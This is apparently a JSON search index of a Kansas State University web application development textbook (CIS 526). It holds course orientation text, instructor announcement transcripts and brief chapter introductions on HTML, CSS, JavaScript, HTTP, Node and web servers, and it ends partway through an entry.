[
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/",
	"title": "Course Information",
	"tags": [],
	"description": "",
	"content": "Forward CIS 526 Course Information Getting Oriented\nWeb Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/week01/",
	"title": "Summer &#39;22 Week 1",
	"tags": [],
	"description": "",
	"content": " Resources Slides Video Script Hello and welcome to the week one Announcements video for CIS 526 and CC 515 in summer 2022. These announcements videos are going to be a little bit more unscripted than what you\u0026rsquo;re used to. So please bear with me as I work through all this content. My name is Russell Feldhausen. And I\u0026rsquo;ll be your instructor for this semester. My contact information is shown here. It\u0026rsquo;s also on the syllabus, it\u0026rsquo;s on the canvas homepage, it\u0026rsquo;s very many places. If you have any questions, you can email me my email is russfeld@ksu.edu. Email is generally my preferred method of communication if you need to chat with me directly. But as I\u0026rsquo;ll talk about in just a second, we\u0026rsquo;ll most likely use discord for most things in this course.\nSo the course structure itself consists of gated modules on Canvas, there are eight modules consisting of eight weeks worth of content. So you\u0026rsquo;ll work through about one module per week, please make sure you go look at the modules and check the due dates, there are items inside of the modules that are due at various times throughout the week. Generally, a lot of the tutorials and activities are due on Fridays. And then the milestones are due the following Monday. So make sure you keep on top on top of that there\u0026rsquo;s a ton of content to work through. So check the due dates on canvas. But like we said, There\u0026rsquo;s eight modules, there are six milestones that you\u0026rsquo;ll be working through. Most of it\u0026rsquo;s going to be posted on canvas. By the time you see this video, I\u0026rsquo;m still working on the last couple of weeks worth of content. But hopefully it should be posted soon enough so you can get started.\nIn this course, we\u0026rsquo;re going to be using Codio. Codio is an online integrated development environment for education. It\u0026rsquo;s really, really handy for learning web development. It gives you access to a full Linux virtual machine on the web, and you\u0026rsquo;ll have root access to that machine. So if you need to install or configure anything, you sure can. However, we\u0026rsquo;ve already provided a standardized environment with all of the tools and libraries that you\u0026rsquo;ll need already pre installed. So most of the time, you don\u0026rsquo;t have to do much of anything to be able to do your work. The other nice thing about working in Codio is it gives me as your instructor direct access to your homework. So as you\u0026rsquo;re working through an activity or tutorial, or even one of the milestones, if you have a question, you don\u0026rsquo;t have to send me your code or screenshots or anything like that. Just tell me what assignments you\u0026rsquo;re on. And I can go load up your code your project and see exactly what you\u0026rsquo;re seeing and help you work through it and debug it. I can even see as you\u0026rsquo;re typing and changing code. And so it works out really, really well. So please take advantage of Codio and use it throughout this course, it really does work well for this particular class.\nWe\u0026rsquo;re also going to use GitHub classroom, the only assignment we\u0026rsquo;re going to put in GitHub classroom is the milestone. But by doing so it gives us some centralized organization for all the Git repos that we\u0026rsquo;re going to create. It also creates a feedback pull request, which I can use to give you feedback on your code and style in your projects. And it helps us by keeping your code private within that organization until the end of the semester, you definitely don\u0026rsquo;t want to be the student that has an open repo, and then somebody starts stealing your work. And then we run into academic integrity issues. So we\u0026rsquo;ll use GitHub classroom. You\u0026rsquo;ll see that later on in the first milestone, but most of you are probably already familiar with it having gone through either CIS 400 or CC 410.\nSo like I said, for communication in this course, the primary place we\u0026rsquo;re going to do that is in discord. There\u0026rsquo;s a channel already created on the computer science Discord server for this class. So anytime you have questions in this course you want to discuss anything you\u0026rsquo;re having trouble with particular assignment. Start out by asking questions in discord. That\u0026rsquo;s by far the best way to do this. It allows me to answer questions quickly and easily. You can post little code snippets or screenshots, if needed, and other students can chime in and they can see the answers that I give. So Discord is by far the best place to start. If you have any personal issues or grading questions or any to do\u0026rsquo;s for me, then please email me directly. That way it comes in my inbox, I use that as my to do list. The thing that I will say is email is the official version of communication for this course. And so if you send me an email, I will strive to respond to it within one business day. However, Discord is much more flexible and easier to use. And so I think for most communication in this class, we\u0026rsquo;ll do discord. But if you don\u0026rsquo;t get an answer, or you need anything specific, you can always email me and I will respond to it there.\nSo one big thing to keep in mind in this course, is how to be successful. First and foremost, I really want you to come into this course with a growth mindset. You can learn how to do this, it might be a little tricky, but come in with the knowledge knowing that you can figure this out and be willing to learn and change is a big part of it. So coming in with that growth mindset is super important. The other thing that is super important in this class is not to just read and watch the stuff that you\u0026rsquo;re doing, but to actually engage with it. For example, a lot of this course consists of activities and tutorials that you work through and co do. And we give you most of the code, you can actually complete the tutorials just by copy pasting code into the right file, hitting submit, you\u0026rsquo;ll complete the tutorial. However, if you don\u0026rsquo;t engage with that code and try and write it yourself and understand exactly what lines of code you\u0026rsquo;re using. You\u0026rsquo;re not actually learning anything. You\u0026rsquo;re just copy pasting and so I can get in Do I work through an entire week\u0026rsquo;s worth of content in this class in about four hours just by copy pasting content, because I needed to check the auto graders to make sure they worked. But I didn\u0026rsquo;t learn anything. So it really is imperative that you take the time to engage with the content, understand every single line of code and every single function that you\u0026rsquo;re writing. So that you can then do that yourself. When you get to the milestone, it\u0026rsquo;s really, really hard. If you just skim through the content, complete the assignment, and then get to the milestone, and you haven\u0026rsquo;t really learned anything. Another big thing I encourage you to do in this class is to work iteratively, a lot of the milestones will have five or six different things you\u0026rsquo;re working on, try and pick one and work on it till completion, before you get to the next part, you can work iteratively test and check your work. Don\u0026rsquo;t try and build the whole thing and then run it and see if it breaks. The other thing you can do, especially since we\u0026rsquo;re using Git in this class is to save your work early and save it often commit to GitHub, every time you work on something on the project, you can always roll back to a previous commit if you need to. So make sure you\u0026rsquo;re committing early committing often. And then finally, in this course, don\u0026rsquo;t be afraid to ask for help. This course especially we\u0026rsquo;re going to push you a little bit and try and get you to do some things that you\u0026rsquo;ll need to do a little bit of research to figure out how to do it. And we expect you to be able to do that. But there are times when you\u0026rsquo;re going to get stuck when things are not going to work. And so I usually tell students, if you\u0026rsquo;ve been spinning your wheels on a problem for about an hour, and you\u0026rsquo;ve been doing some searching and you\u0026rsquo;ve tried different things and you haven\u0026rsquo;t gotten past it, that\u0026rsquo;s a good time to take a step back, ask for help and get some inputs. The thing that I hate to see the most is students to spend five or six hours trying to solve a problem. And then when they ask for help, it turns out that it\u0026rsquo;s an unsolvable problem to begin with. And so it\u0026rsquo;s always worth taking the time and asking for help. If you get stuck, I\u0026rsquo;m always here to help you out. I\u0026rsquo;m going through the projects exactly the same as you\u0026rsquo;re going through them. And so I\u0026rsquo;m happy to help you anytime you have a question.\nSo throughout this course, we\u0026rsquo;re going to work on a large web development project called Community Chest. The idea behind Community Chest is kind of like the blessing boxes or some of those lending libraries that you\u0026rsquo;ve seen, where you have a location where people can put items that other people in the community might need. So we\u0026rsquo;re going to track those throughout the semester. There are six milestones to this project, most of the milestones focus on the functionality of the website. So being able to render a page that has certain content on it, being able to accept data via forms and stored in a database. So most of the milestones are around the functionality of the website. However, because this is a web development course, your style and design does count. So not only the the visual style of the website, but the coding style, making sure you\u0026rsquo;re taking advantage of the features of cascading style sheets and building JavaScript modules. And not you know, copy pasting code everywhere, you\u0026rsquo;re actually thinking about the structure and the content of your webpage. So like I said, mostly we\u0026rsquo;re looking for functionality, but style and design do count. And you\u0026rsquo;re more than welcome to make this your own. You can spend lots of time on the design in this course, and really make it functional and beautiful. And also bear in mind that the final milestone does have a 20 point bonus on it for really good looking websites. So it\u0026rsquo;s worth your time to take your time and actually build a useful website. For the milestones themselves. You can use external libraries in most of those milestones. So make sure you read the bottom what you can and can\u0026rsquo;t use. But if you want to use a CSS library, such as Bootstrap, or a JavaScript library, such as jQuery, look at the milestones, make sure that that\u0026rsquo;s allowed. And of course, if you have any questions, you can ask me anytime.\nSo that\u0026rsquo;s really all the content you need to get started on this course. Throughout the semester, I highly encourage you to keep in touch by following the discussions on the discord channel, you, you one of your first assignments is going to be introducing yourself on Discord. So make sure you get that done soon. Another thing that we do throughout the semester is we will have tea time office hours. Tea Time office hours are Tuesdays at 3:30 and Fridays at 10:30. The whole point behind tee time office hours is it\u0026rsquo;s a time for us to get together and talk about anything except the class that you\u0026rsquo;re working on. Typically, it\u0026rsquo;s myself and a few other faculty members at K State where we just get together and we hang out while we work on stuff. Sometimes we have other students or alumni or industry folks stop by. So it\u0026rsquo;s a great time if you just want to hang out chat with us. Even if you just hang out in the background and listen to what we\u0026rsquo;re talking about while you work on the assignments. You\u0026rsquo;re more than welcome to join us for tea time. Again, that\u0026rsquo;s on Zoom Tuesdays at 330 Fridays at 1030. You\u0026rsquo;ll get the link via discord. And then finally if you have any questions you can schedule a one on one office hours with me using my Calendly link. It\u0026rsquo;s on the syllabus it\u0026rsquo;s on the course homepage on canvas. That\u0026rsquo;s your easiest way if you want to get one on one office hours with me. However, I encourage you to try and work on it on your own and work through discord first and only schedule office hours if you really feel like you need that interactive work with me. I do reserve the right to limit my access to Office Hours in case it becomes a problem.\nSo other than that, best of luck to you on this semester. That should be everything you need to get started on the first module. I will strike have to post announcements videos about once per week so watch for those usually on Mondays as always if you have any questions you can reach out to me on Discord you can find me via email and I will look forward to having you in this class this semester Good luck\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/02-week2/",
	"title": "Week 2",
	"tags": [],
	"description": "",
	"content": " "
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/01-introduction/",
	"title": "Course Introduction",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nCourse Resources Previous Versions Slides Syllabus Textbook Video Script Hello, and welcome to CIS 526 - Web Application Development, and also CC 515 - Full Stack Web Development. Even though these are two different courses in the catalog, they teach the same content and will use the same Canvas course. So, anywhere you see CIS 526 in this course, you can also mentally substitute CC 515 in its place.\nMy name is Russell Feldhausen, and I\u0026rsquo;ll be your instructor for this course. My contact information is shown here, and is also listed on the syllabus, and on the home page of the course on K-State Online. My email address is russfeld@ksu.edu, and it is the official method of communication for matters outside of this course, since it allows me to have a record of our conversations and respond when I\u0026rsquo;m available. However, I\u0026rsquo;ll also be available via the K-State CS Discord server, so you can easily chat with me there. There is a channel already created for this course that I encourage you to make use of throughout this course.\nFor communication in this course, there are two basic methods that I recommend. For general questions about the course, content, getting help with labs, and any other items relevant to the course, I encourage you to use the course channel on Discord. This allows all of us to communicate in a single space, and it also means that any questions I answer will immediately be available for the whole class. For personal issues, grading questions, or if you have something that is a \u0026ldquo;to-do\u0026rdquo; item for me, please email me directly. While I will strive to check Discord often, I\u0026rsquo;ve found that sometimes tasks can get lost in the discussion, so having an email in my inbox to prompt me to follow up is very helpful.\nI am working remotely out of my home in Kansas City, so I won\u0026rsquo;t be available on campus regularly during the Summer 2022 semester. I do have an office, and I will be there from time to time when I can during the summer to meet with folks on campus and hold office hours. I\u0026rsquo;ll be sure to announce those times as they are scheduled.\nBefore we begin, I must give all the credit to Dr. Nathan Bean for developing nearly all of the content in this course. Nearly everything you\u0026rsquo;ll see during this course was originally written and constructed by Dr. Bean, and I\u0026rsquo;m simply the person teaching it this semester. I\u0026rsquo;m working on adding a few parts based on my own expertise, so you may see some new things toward the end of the semester.\nFor a brief overview of the course, there are a total of 8 modules of content, containing textbook pages, activities, tutorials, and more that you\u0026rsquo;ll complete. In addition, throughout the semester you\u0026rsquo;ll be working on a large-scale web application project which consists of 6 milestones. The modules are configured in K-State Canvas as gated modules, meaning that you must complete each item in the module in order before continuing. There will be one module due each week, and you may work ahead at your own pace. Finally, all work in this course must be completed and all labs graded by no later than July 29th, 2022.\nLooking ahead to the rest of this first module, you\u0026rsquo;ll see that there are a few more items to be completed before you can move on. In the next video, I\u0026rsquo;ll discuss a bit more information about navigating through this course on Canvas, using Codio, and using the videos posted on YouTube.\nOne thing I highly encourage each of you to do is read the syllabus for this course in its entirety, and let me know if you have any questions. My view is that the syllabus is a contact between me as your teacher and you as a student, defining how each of us should treat each other and what we should expect from each other. I have made a few changes to my standard syllabus template for this course, and those changes are clearly highlighted. Finally, the syllabus itself is subject to change as needed as we adapt to this new course layout and format, and all changes will be clearly communicated to everyone before they take effect.\nThe grading in this course is very simple. First, 15% of your grade consists of completing the short activities and quizzes scattered throughout the course. Another 35% of your grade consists of completing the interactive tutorials. Finally, 50% of your grade comes from completing the 6 project milestones throughout the semester. Also, notice that the final milestone is worth double the amount of points, so it is very important that you get to the end of the course and complete that milestone. There will be some extra credit points available, mainly through the Bug Bounty assignment, which you will review as part of this module. Lastly, the standard \u0026ldquo;90-80-70-60\u0026rdquo; grading scale will apply, though I reserve the right to curve grades up to a higher grade level at my discretion. Therefore, you will never be required to get higher than 90% for an A, but you may get an A if you score slightly below 90% if I choose to curve the grades.\nSince this is a completely online course, you may be asking yourself what is different about this course. First off, you can work ahead at your own pace, and turn in work whenever you like before the due date. However, as discussed before, you must do all the readings and assignments in order before moving on, so you cannot skip ahead.\nIn addition, due to the flexible online format of this class, there won\u0026rsquo;t be any long lecture videos to watch. Instead, each module will consist of several short lessons and tutorials, each focused on a particular topic or task. Likewise, there won\u0026rsquo;t be any textbooks formally used, but you\u0026rsquo;ll be directed to a bevy of online resources for additional information.\nWhat hasn\u0026rsquo;t changed, though, is the basic concept of a college course. You\u0026rsquo;ll still be expected to watch or read about 6 hours of content to complete each module. In addition to that, each lab assignment may require anywhere from 1 to 6 hours of work to complete. If you plan on doing a module every week, that roughly equates to 6 hours of content and 6 hours of homework each week, which is the expected workload from a 3 credit hour college course during the summer.\nAlso, while some of the activities will be graded automatically, much of the grading will still be done directly by me. This includes the project milestones. For each milestone, I\u0026rsquo;ll try to give you timely feedback so you can improve on your design before the next milestone is due.\nFor this class, each student is required to have access to a modern web browser and a high-speed internet connection. If you have any concerns about meeting these requirements, please contact me ASAP! We may have options available through some on-campus resources to help you out.\nThis summer, I\u0026rsquo;ll be working on a few updates to this course. These updates will mainly affect the second half of the course, and focus on updating a few of the items and introducing some newer technologies and libraries you may come across.\nFinally, as you are aware, this course is always subject to change. While we have taught this class several times before, there may be a few hiccups as we get started due to new software and situations. The best advice I have is to look upon this graphic with the words \u0026ldquo;Don\u0026rsquo;t Panic\u0026rdquo; written in large, friendly letters, and remember that it\u0026rsquo;ll all work out in the end as long as you know where your towel is.\nSo, to complete this module, there are a few other things that you\u0026rsquo;ll need to do. The next step is to watch the video on navigating Canvas and using the YouTube videos, which will give you a good idea of how to most effectively work through the content in this course.\nTo get to that video, click the \u0026ldquo;Next\u0026rdquo; button at the bottom right of this page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/00-forward/01-introduction/old/summer2021/",
	"title": "Course Introduction",
	"tags": [],
	"description": "",
	"content": " Web Only\nThis textbook was authored for the CIS 526 - Web Application Development course at Kansas State University. This front matter is specific to that course. If you are not enrolled in the course, please disregard this section.\nCourse Resources Syllabus Textbook Welcome Message Hello students, and welcome to CIS 526 – Web App Design. My name is Nathan Bean, and I will be your instructor for this course. I wanted to briefly discuss the structure and delivery of the course here, and you can find more detail in the sections to come.\nOf important note is that we are packing a lot of content into an eight-week summer course. This will be a significant amount of work, and you will need to stay on top of it. I recommend putting aside 10 to 20 hours every week to work on the class. Remember, whomever does the work does the learning - so you\u0026rsquo;ll need to put in the work.\nCanvas First, we will be using K-State Online (canvas) more heavily than you probably are used to. I\u0026rsquo;ve also stripped out a lot of the Canvas tools that we simply aren\u0026rsquo;t using to focus on those we are. I am dividing the course into weeks, each of which is contained in a module in Canvas, and listed in the order I would suggest you explore the content. Thus, you can look at each week’s module to see what you need to accomplish. Additionally, all authoritative due dates will appear in Canvas. You can see them in the sidebar, and also under the assignment listings.\nCodio A second tool we’ll be making heavy use of is the Codio platform. Codio is also an online learning tool, but one meant specifically for programmers. It combines content delivery with an online IDE (Integrated Development Environment), and each unit in Codio runs on a virtual machine running Linux that you have full root level access to. This is an inordinately powerful tool for learning web development, especially when you consider the vast majority of web applications are hosted on Linux servers. Another great benefit is that if you have a question about an error you’re encountering in your code, and you’d like me to take a look – you don’t have to send me code snippets or screenshots in an email. Just a description of your problem, because I can open your project in Codio and have direct access to your work. This also means I can give you faster and more accurate feedback – not a bad thing when we’re trying to cover as much as we are.\nDiscord We\u0026rsquo;ll also be using the departmental Discord server heavily for communications. Our first assignment is an icebreaker – introducing ourselves in the #cis526 channel. Why, you wonder? Am I a sadist? Well, no. One of the biggest differences in online courses is that it is often just you interacting with the course content the instructor has developed. It can be almost as if you were taking the class by yourself. That’s great in some ways, but it can also suck in others. So by introducing ourselves, we have an idea of who else is in the course – the same way you could look across the classroom and see your fellow students.\nVideos You may have had online courses where the professor recorded their regular in-class lectures and uploaded them as one-hour videos. I hated that as a student, and I think it is a poor pedagogical strategy. When I give you video materials, I will strive to keep them short, succinct, and do enough post-processing that they flow reasonably well. I’ll also post them through YouTube, so you can speed them up if you like.\nReadings But most of the topics I would normally cover in a lecture will be done through an interactive online textbook delivered through canvas. This allows me to embed hands-on examples tied to the subjects we are discussing and gives you some opportunity to move through the material at your own pace and choice of time. There are also micro-assessments sprinkled throughout the text. These are not meant to be tricky or difficult, but rather to encourage you to reflect on what you just read and apply it. These assessments can be taken as many times as it takes to reach the right answer without penalty. My goal with the micro-assessments is just to help you engage with the material.\nTutorials Additionally, I will be making a number of step-by-step tutorials working through a particular challenge related to the week’s content. The tutorials will often directly relate to some aspect of the week’s project, so there is some real value to working through them, especially if you are uncomfortable with the assignment requirements. I will offer help if you get stuck on a tutorial, just as I will for assignments. So don’t hesitate to ask. And, just like the readings, you can submit a tutorial as many times as you need. Each tutorial will offer automated feedback letting you know if you\u0026rsquo;ve missed anything.\nProjects Throughout the semester we will be creating a full-stack web application for \u0026ldquo;Community Chest\u0026rdquo;. This is a burgeoning non-profit organization looking to place \u0026ldquo;exchange\u0026rdquo; bins around Manhattan where people can donate small items to benefit the needy. Our web application will provide locations for the bins, and guidance for what people need and have to share.\nOffice Hours I will be holding office hours virtually over Zoom, by appointment and possibly at a pre-scheduled time. Your first chat assignment includes a prompt for what time(s) would be best to meet for you - if there is a consensus I may have a regularly scheduled weekly session.\nTea Time Office Hours The CS Faculty and Support staff are also holding bi-weekly virtual tea time meetings this summer, where we talk about any subjects except the course. This is a good chance to meet more of your faculty in an informal setting and ask questions you may have about the industry, field, etc. Tea time hours will be posted in Discord and as a Canvas announcement.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "At this point, you should be familiar with the big three technologies of the world-wide-web HTML, CSS, and JavaScript (Feel free to visit the appendices for a quick review). These three technologies work together to create the web pages you interact with every day. Each has a role to play in defining the final appearance of a web page:\nHyper-Text Markup Language (HTML) provides the structure and content Cascading Style Sheets (CSS) determine how that content should appear visually JavaScript provides interactivity, allowing both the structure and appearance of the page to change dynamically We often refer to this division of responsibility as the separation of concerns. By placing all responsibility for appearance on a CSS file, we can refresh the look of a web application simply by replacing the old CSS file with a new one. Similarly, we can create a new page in our site that looks and feels like the rest of the site by creating a new HTML page that links to the site\u0026rsquo;s existing CSS files.\nWhile you have written HTML, CSS, and JavaScript files in your prior learning experiences, you might not have thought about just how these files are processed, and those styling rules applied. In this chapter we will explore this topic in detail, while introducing some more advanced uses for each.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/02-http/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "At the heart of the world wide web is the Hyper-Text Transfer Protocol (HTTP). This is a protocol defining how HTTP servers (which host web pages) interact with HTTP clients (which display web pages).\nIt starts with a request initiated from the web browser (the client). This request is sent over the Internet using the TCP protocol to a web server. Once the web server receives the request, it must decide the appropriate response - ideally sending the requested resource back to the browser to be displayed. The following diagram displays this typical request-response pattern.\nThis HTTP request-response pattern is at the core of how all web applications communicate. Even those that use websockets begin with an HTTP request.\nInfo\nThe HTTP standard, along with many other web technologies, is maintained by the World-Wide-Web Consortium (abbreviated W3C), stakeholders who create and maintain web standards. The full description of the Hyper-Text Transfer Protocol can be found here w3c\u0026rsquo;s protocols page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/03-asynchronous-js/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "JavaScript makes extensive use of asynchronous processing to tackle the challenge of concurrency. This includes the events we\u0026rsquo;ve already talked about (user events, network events and timers), but it has also been expanded to provide even more powerful features. The XMLHTTPRequest object allows JavaScript to request additional resources directly in an asynchronous manner, and the more recent Fetch API updates that approach. Web workers allow parallel JavaScript processes to be run in the browser. And new ES6 syntax and constructs like Promises and the async/await keywords make asynchronous functions easier to reason about and use. In this chapter, we will explore each of these topics.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/04-node/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Node is an open-source, cross-platform JavaScript runtime environment build on Google\u0026rsquo;s V8 engine. It was created by Ryan Dahl in 2009 to allow for server-side scripting in JavaScript.\nECMAScript Support Node supports most of the features of ECMAScript 2015 (ES6), with the notable exception of ES6 modules (as Node adopted the CommonJS module approach before the ES6 proposal, and the two approaches are not interchangeable). You can learn more about Node\u0026rsquo;s ES6 support here.\nDifferences between Browser JavaScript and Node While JavaScript in the browser has been deliberately sandboxed and is only allowed to interact with the current document and the Internet, Node can interact with the file system and operating system of the hosting computer. Also, because Node is not hosted in a browser, it has no Document Object Model (DOM), and no document or window global variables. To reflect this, the global namespace for Node is global instead of window.\nInfo\nNode can be downloaded for Windows, Linux, and MacOS at https://nodejs.org/en/. Documentation for Node is found at https://nodejs.org/en/docs/. On many Linux and Mac systems, multiple versions of Node can be installed and managed using Node Version Manager (nvm). Using nvm may be preferred on those systems since most package repositories include older and outdated versions of Node.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/05-web-servers/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "The first web servers were developed to fulfill a simple role - they responded to requests for HTML documents that were (hopefully) located in their physical storage by streaming the contents of those documents to the client.\nThis is embodied in our request-response pattern. The client requests a resource (such as a HTML document), and receives either a status 200 response (containing the document), or an error status code explaining why it couldn\u0026rsquo;t be retrieved.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "While the first generation of webservers was used to serve static content (i.e. files), it was not long before developers began to realize that a lot more potential existed in the technologies of the web. A key realization here is that the resources served by the web server don\u0026rsquo;t need to exist to be served.\nConsider the directory listing from the previous chapter. It is not based on an existing file, but rather is dynamically created when requested by querying the file system of the server. This brings one clear benefit - if we add files to the directory, the next time we request the listing they will be included.\nThus, we can create resources dynamically in response to a request. This is the core concept of a dynamic web server, which really means any kind of web server that generates at least some of its content dynamically. In this chapter, we will explore this class of web server.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/07-persistent-storage/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Of course, what made dynamic web servers interesting was that they could provide content built dynamically. In this approach, the HTML the server sends as a response does not need to be stored on the server as a HTML file, rather it can be constructed when a request is made.\nThat said, most web applications still need a persistent storage mechanism to use in dynamically creating those pages. If we\u0026rsquo;re dealing with a forum, we need to store the text for the posts. If we\u0026rsquo;re running an e-commerce site, we aren\u0026rsquo;t making up products, we\u0026rsquo;re selling those already in our inventory.\nThus, we need some kind of storage mechanism to hold the information we need to create our dynamic pages. We could use a variable and hold those values in memory, but we\u0026rsquo;d also need a mechanism to persist those values when our server restarts (as the contents of volatile memory are lost when power is no longer supplied to RAM).\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/08-routing/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Once again, we\u0026rsquo;ll return to the request-response pattern diagram.\nWe revisit this diagram because it is so central to how HTTP servers work. At the heart, a server\u0026rsquo;s primary responsibility is to respond to an incoming request. Thus, in writing a web server, our primary task is to determine what to respond with. With static web servers, the answer is pretty simple - we map the virtual path supplied by the URL to a file path on the file server. But the URL supplied in a request doesn\u0026rsquo;t have to correspond to any real object on the server - we can create any object we want, and send it back.\nIn our examples, we\u0026rsquo;ve built several functions that build specific kinds of responses. Our serveFile() function serves a response representing a static file. Our listDirectory() function generates an index for a directory, or if the directory contained a index.html file, served it instead. And our dynamic servePost() from our blog served a dynamically generated HTML page that drew data from a database.\nEach of these functions created a response. But how do we know which of them to use? That is the question that we will be grappling with in this chapter - and the technical term for it is routing.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/09-auth/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "An important part of any dynamic web server is controlling how, and by whom, it is used. This is the domain of authentication and authorization. Authentication refers to mechanisms used to establish the identity of a user, and authorization refers to determining if an authenticated user has permission to do the requested action in the system. Collectively, these two concepts are often referred to by the abbreviation auth.\nConsider a content management system (CMS) - a dynamic website for hosting content created by authorized users. The K-State website is an example of this kind of site - the events, articles, and pages are written by various contributors throughout the university. It is important that only authorized agents of the university (i.e. staff and faculty) are allowed to publish this content. Can you imagine what would happen if anyone could post anything on the K-State website?\nIn this chapter, we\u0026rsquo;ll examine strategies for performing both authentication and authorization.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/10-dynamic-web-frameworks/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "You have now learned about and built examples of several early implementations for web applications - file servers and server pages. These kinds of web applications dominated the Internet in the 90\u0026rsquo;s, and continue to play a major role today. However, the needs of web applications grew increasingly more dynamic as the web continued to evolve, leading to the development of truly dynamic web servers built around a stack of technologies. You\u0026rsquo;ve also built several of these as well\u0026hellip; and discovered just how long it can take to build one from scratch.\nConsider the simple case of an online store - it must authenticate users, keep track of their shopping carts, and in processing orders, send emails to the user and instructions to inventory/warehouse systems. These are not trivial needs, nor are the programs built to meet them simple. These needs heralded the introduction of full-stack web development approaches; the stack being a combination of technologies that had to be used together effectively to host a web application.\nIn order to be a web developer, therefore, a programmer needed familiarity with a number of technologies, a basic grounding in IT, and proficiency with a programming languages. Of course, there were a limited number of professionals with these capacities available, and demand for them has never stopped growing.\nMoreover, the applications themselves began to grow increasingly complex. It is very likely that you\u0026rsquo;ve already found yourself struggling to understand the various parts of our examples in this class, and how they fit together. This was also true for the developers tackling these problems in the past, especially as many did not have deep enough training. This situation paralleled the software crisis of the 70\u0026rsquo;s, where increasingly sophisticated programs were being developed by undertrained programmers, and software development was plagued with cost overruns, missed deadlines, and failed projects.\nOne major outcome of the software crisis was the development of software engineering techniques, and changes to programming languages to help programmers make less errors in writing code, and find their errors more quickly. A similar process occurred with web development in the 2000\u0026rsquo;s, leading to the development of \u0026ldquo;web frameworks\u0026rdquo;. These grew from the realization that most dynamic web servers need the same core features - the ability to interact with persistent data sources, to authenticate users and keep track of their actions on the site, and to interact with other servers. A web development framework seeks to provide those features, allowing the developer to quickly get started building the more unique features of the server.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/a-html/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Hyper-Text Markup Language (HTML) alongside Hyper-Text Transfer Protocol (HTTP) formed the core of Sir Tim Berners-Lee\u0026rsquo;s world-wide web. As the name implies, HTTP is a markup language, one that combines the text of what is being said with instructions on how to display it.\nThe other aspect of HTML is its hyper-text nature. Hyper-text refers to text that links to additional resources - primarily the links in the document, but also embedded multimedia.\nThis ability to author structured pages that linked to other structured pages with a single mouse click is at the heart of the World-Wide-Web.\nNote\nThe HTML standard, along with many other web technologies, is maintained by the World-Wide-Web Consortium (abbrivated W3C), stakeholders who create and maintain web standards. The full description of the Hyper-Text Markup Language can be found here w3c\u0026rsquo;s HTML page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/b-css/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "Style sheets are collections of rules for modifying how a SGML document appears. Cascading Style Sheets (CSS) are the specific implementation adopted by the W3C for HTML.\nThe core concept of CSS is that defines rules altering the appearance of HTML elements that can be selectively applied. These rules are held in a document (the style sheet) and are applied in a well-defined priority order (the cascading part of CSS).\nAs of CSS Version 3, CSS technologies were split into separate modules allowing them to be revised and maintained separately. Each module adds or extends features to those defined in CSS Version 2, in order to maintain backwards compatibility.\nInfo\nThe CSS standards, along with many other web technologies, are maintained by the World-Wide-Web Consortium (abbreviated W3C), stakeholders who create and maintain web standards. The full drafts of the Cascading Style Sheets standards can be found here w3c\u0026rsquo;s CSS page.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/c-js/01-introduction/",
	"title": "Introduction",
	"tags": [],
	"description": "",
	"content": "As the World Wide Web was gaining popularity in the mid-nineties, browser manufacturers started experimenting with interpreting program scripts embedded within webpages. By far the most successful of these was JavaScript, initally developed by Brandon Eich for Netscape.\nBrandon Eich was hired to integrate the Scheme programming langauge into the Netscape browser. But when Netscape cut a deal with Sun Microsystems to bring Java Applets to their browser, his mission was altered to create a more Java-like langauge. He developed a prototype in only ten days, that blended Java syntax, the Self object-orientation approach, and Scheme functionality.\nNetscape eventually submitted JavaScript to ECMA International, resulting in the ECMAScript standard, and opening the door for other browsers to adopt JavaScript. Currently all major browsers support the full ECMAScript 5 standard, and large chunks of ECMAScript 6 and some parts of later versions as well. Moreover, transpilation can be utilized to make newer ECMAScript-compliant code run on older browser versions.\nInfo\nThe ECMA standard is maintained by ECMA International, not the W3C. However, its development process is very similar, involving stakeholders developing proposals for new and improved features.\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/01-the-dom/",
	"title": "The DOM",
	"tags": [],
	"description": "",
	"content": "Chapter 1 The Document Object Model HTML, CSS, and JavaScript in the Browser\n"
},
{
	"uri": "https://ksu-cs-textbooks.github.io/cis526/y-announcements/old/summer2021/04-milestone4/",
	"title": "Milestone 4",
	"tags": [],
	"description": "",
